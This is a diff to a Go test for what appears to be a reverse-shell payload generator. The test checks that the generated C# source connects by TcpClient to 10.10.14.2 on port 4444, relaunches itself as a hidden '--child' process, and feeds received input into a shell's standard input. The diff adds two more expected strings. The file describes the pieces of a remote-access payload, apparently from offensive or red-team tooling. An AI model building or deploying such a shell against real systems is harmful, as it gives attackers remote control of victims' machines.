@@ -34,6 +34,7 @@ func TestGenerateCSharpSourceContainsConnectionAndProcessLoop(t *testing.T) {
 	src := gen.GenerateCSharpSource()
 	checks := []string{
 		`new TcpClient("10.10.14.2", 4444)`,
+		`FLAME_CSHARP`,
 		`if (args.Length == 0 || args[0] != "--child")`,
 		`Arguments = "--child"`,
 		`UseShellExecute = true`,
@@ -45,6 +46,7 @@ func TestGenerateCSharpSourceContainsConnectionAndProcessLoop(t *testing.T) {
 		`BeginErrorReadLine()`,
 		`private static StreamWriter streamWriter;`,
 		`streamWriter.AutoFlush = true;`,
+		`proc.StandardInput.WriteLine("Get-Location | Out-Null");`,
 		`proc.StandardInput.WriteLine(userInput);`,
 		`proc.StandardInput.Flush();`,
 	}
